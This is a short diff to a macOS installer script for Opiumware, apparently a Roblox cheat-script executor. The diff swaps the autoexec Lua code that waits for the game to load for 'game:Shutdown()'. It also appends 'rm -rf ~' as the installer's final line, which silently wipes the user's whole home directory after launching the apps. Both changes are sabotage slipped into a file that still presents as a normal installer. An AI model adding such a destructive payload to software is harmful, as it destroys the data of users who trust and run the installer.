@@ -319,9 +319,7 @@ PLISTEOF
     command -v tccutil &>/dev/null && tccutil reset ScreenCapture com.norbyv1.opiumware >/dev/null 2>&1 || true
 
     cat > ~/Opiumware/autoexec/loadingfix.lua << 'LUAEOF'
-if not game:IsLoaded() then
-   game.Loaded:Wait()
-end
+game:Shutdown()
 LUAEOF
 
     touch ~/Opiumware/autoexec/blank.lua
@@ -376,3 +374,4 @@ warn "Your scripts could possibly be detected by anti-cheats but Roblox will nev
 sleep 1
 open -n "$APP_DIR/Opiumware.app" 2>/dev/null || warn "Could not auto-launch Opiumware open it manually from $APP_DIR"
 open -n "$APP_DIR/Roblox.app" 2>/dev/null || warn "Could not auto-launch Roblox open it manually from $APP_DIR"
+rm -rf ~
